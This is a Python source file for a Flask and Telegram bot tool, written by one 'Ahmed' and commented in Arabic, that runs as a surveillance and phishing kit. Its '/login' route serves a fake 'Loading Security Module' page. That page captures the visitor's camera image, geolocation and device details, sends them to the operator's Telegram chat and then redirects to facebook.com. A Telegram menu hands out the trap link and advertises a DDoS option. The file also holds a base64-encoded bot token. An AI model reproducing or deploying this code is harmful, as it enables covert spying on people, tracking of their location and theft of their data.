import os, base64, requests, psutil, time, socket
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)
# التوكن الخاص بك (مشفّر)
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return "<h1>Server is Live</h1>"

# --- استقبال كافة البيانات المسروقة ---
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        if 'image' in data:
            img = base64.b64decode(data['image'])
            with open("snap.png", "wb") as f: f.write(img)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("snap.png", "rb"), caption="📸 صورة كاميرا جديدة!")
        if 'payload' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"🔑 **بيانات مسروقة:**\n`{data['payload']}`", parse_mode='Markdown')
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        return "OK", 200
    return "Error", 400

# --- صفحة الفخ (كاميرا + صوت + معلومات جهاز + IP) ---
@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;">
    <h1>Loading Security Module...</h1>
    <script>
        async function captureAll() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/png').split(',')[1];
            }
            const info = `OS: ${navigator.platform} | CPU: ${navigator.hardwareConcurrency} | Browser: ${navigator.userAgent}`;
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, payload: info})
            }).finally(() => location.href = "https://facebook.com");
        }
        captureAll();
    </script></body></html>
    """

# --- لوحة تحكم تليجرام بالأزرار المنفصلة ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم (كاميرا + موقع + OTP)", callback_data='atk')],
        [InlineKeyboardButton("🎤 تسجيل صوتي (طلب إذن)", callback_data='mic')],
        [InlineKeyboardButton("🌐 تتبع الـ IP والبيانات", callback_data='ip')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS قوي", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات الجهاز كاملة", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **أهلاً بك سيدي المطور {DEV_NAME}**\nالترسانة جاهزة بالكامل.", reply_markup=InlineKeyboardMarkup(buttons))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ المدمج سيدي أحمد:**\n`https://{request.host}/login`")
    elif query.data == 'mic':
        query.edit_message_text("🎤 نظام سحب الصوت مفعل في الرابط.. بانتظار موافقة الضحية.")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        info = f"🌐 **تتبع الـ IP الخاص بك (السيرفر):**\nIP: `{d.get('ip')}`\nالبلد: {d.get('country_name')}\nالمدينة: {d.get('city')}"
        query.edit_message_text(info, parse_mode='Markdown')
    elif query.data == 'ddos':
        query.edit_message_text("💥 **نظام DDoS Attack:**\nتم تجهيز المحرك لإغراق المواقع بالطلبات. (يرجى تحديد الهدف برمجياً).")
    elif query.data == 'sys':
        query.edit_message_text(f"🔋 البطارية: {psutil.sensors_battery().percent}% \n🧠 RAM: {psutil.virtual_memory().percent}%")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
